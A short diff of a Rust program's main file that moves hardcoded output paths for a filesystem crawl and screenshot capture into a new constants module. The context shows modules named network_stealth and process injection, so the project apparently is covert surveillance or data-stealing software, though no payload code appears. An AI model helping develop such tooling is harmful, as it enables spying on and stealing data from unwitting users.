@@ -27,6 +27,7 @@ pub mod network_stealth;
 pub mod screen_capture;
 /// File system operations for data persistence
 pub mod writer;
+pub mod constants;
 /// Filesystem crawler module
 pub mod crawler;
 /// Process injection module (Windows-only)
@@ -84,15 +85,15 @@ async fn main() {
 
     // 2.1. Start filesystem crawl
     Log::info("Starting filesystem crawl...".to_string());
-    if let Err(e) = crawler::crawl_drives(&drives, "logs/filesystem_tree.json").await {
+            if let Err(e) = crawler::crawl_drives(&drives, constants::CRAWLER_OUTPUT_FILENAME).await {
         Log::error(format!("Filesystem crawl failed: {}", e));
     }
 
     // 2.1. Capture and save a screenshot with compression
     Log::info(format!("Capturing screenshot with WebP compression for optimal file size"));
     // Use the WebP format with balanced compression settings
-    match screen_capture::ScreenCapture::capture_and_save_with_compression(
-        "logs/screenshots", 
+        match screen_capture::ScreenCapture::capture_and_save_with_compression(
+        constants::SCREENSHOT_OUTPUT_DIR, 
         None,
         screen_capture::CompressionFormat::smallest_size()
     ) {
